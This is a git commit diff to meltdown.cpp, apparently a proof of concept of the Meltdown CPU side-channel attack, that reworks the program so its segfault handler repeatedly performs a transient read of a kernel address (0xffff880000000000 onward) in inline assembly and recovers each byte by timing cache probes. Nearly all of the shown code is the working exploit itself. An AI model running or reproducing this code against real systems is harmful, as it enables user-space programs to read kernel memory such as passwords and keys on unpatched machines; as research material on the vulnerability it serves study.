60a7be16adf921a2303a86fb181b9e44748c73f1
IcePic <icepic1984@gmx.de>
2018-01-05 22:19:42 +0100

    Recursive exception handling

--- meltdown.cpp
+++ meltdown.cpp
@@ -4,6 +4,9 @@
 
 char* data;
 
+char* addr = reinterpret_cast<char*>(0xffff880000000000);
+
+// See https://eprint.iacr.org/2013/448.pdf
 unsigned long probe(char* addr)
 {
     volatile unsigned long time;
@@ -35,17 +38,30 @@ static void handler(int sig, siginfo_t* si, void* unused)
 
     for (int i = 0; i < 256; ++i)
         printf("Index: %d Time: %d\n", i, result[i]);
+
+    delete[] data;
+    data = new char[256 * 4096];
+
     
+    ++addr;
+
+    asm __volatile__("mov rax, 0 \n"
+                     "retry_h:  \n"
+                     "mov al, BYTE PTR [%0] \n" // Trigger exception
+                     "shl rax, 0xc \n"             
+                     "jz retry_h \n"
+                     "mov rbx, QWORD PTR [%1 + rax] \n"
+                     :
+                     : "r"(addr), "r"(data)
+                     : "rax", "rbx");
+
     exit(1);
 }
 
 int main(int argc, char* argv[])
 {
     data = new char[256 * 4096];
-    char* test = new char[256];
-    for(int i = 0; i < 256; ++i)
-        test[i] = i;
-
+    
     // Register segfault handler
     struct sigaction sa;
     sa.sa_flags = SA_SIGINFO | SA_NODEFER;
@@ -56,32 +72,8 @@ int main(int argc, char* argv[])
         exit(1);
      }
     
-    
-    
-    // std::cout <<argv[1]<< std::endl;
-    // uint8_t* addr = reinterpret_cast<uint8_t*>(strtol(argv[1], NULL, 0));
-    char* addr = reinterpret_cast<char*>(0xffff880000000040);
-    //char* addr = &test[144];
-
-    // Access data without permission adn trigger exception
-    asm __volatile__("mov rax, 0 \n"
-                     "retry:  \n"
-                     "mov al, BYTE PTR [%0] \n"
-                     "shl rax, 0xc \n"
-                     "jz retry \n"
-                     "mov rbx, QWORD PTR [%1 + rax] \n"
-                     :
-                     : "r"(addr), "r"(data)
-                     : "rax", "rbx");
-    
-    // Never gets called if addr is not in a valid range
-    unsigned long result[256];
-
-    for (int i = 0; i < 256; ++i)
-        result[i] = probe(&data[i * 4096]);
-
-    for (int i = 0; i < 256; ++i)
-        printf("Index: %d Time: %d\n", i, result[i]);
-  
-    return 0;
+    // Trigger exception.
+    // Exception handler will be called
+    // First call is useless
+    return(addr[0]);
 }
